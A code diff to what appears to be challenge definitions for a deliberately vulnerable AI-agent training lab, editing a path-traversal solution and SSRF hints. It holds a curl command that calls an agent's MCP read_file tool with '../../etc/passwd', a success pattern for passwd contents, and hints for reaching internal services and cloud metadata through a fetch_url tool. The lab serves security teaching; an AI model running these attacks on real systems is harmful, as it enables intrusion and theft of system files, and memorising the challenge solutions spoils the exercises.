@@ -248,7 +248,7 @@ using path traversal techniques.
 ToolBot (port 7010) accepts path traversal via MCP JSON-RPC:
 
 curl -s http://localhost:7010/ -H 'Content-Type: application/json' \\
-  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"read_file","arguments":{"path":"../../../etc/passwd"}},"id":1}'
+  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"read_file","arguments":{"path":"../../etc/passwd"}},"id":1}'
     `,
     successCriteria: {
       pattern: /root:x:0:0|\/bin\/bash|Path traversal/i,
@@ -602,8 +602,8 @@ reachable from the outside.
       'Extract data from an internal endpoint',
     ],
     hints: [
-      'Try URLs like http://localhost/admin',
-      'Cloud metadata endpoints (169.254.169.254) might work',
+      'Internal services here are the other DVAA agents, on localhost ports 7001-7023',
+      'Every agent answers GET /info',
       'The tool is at /mcp/execute with tool name "fetch_url"',
     ],
     solution: `
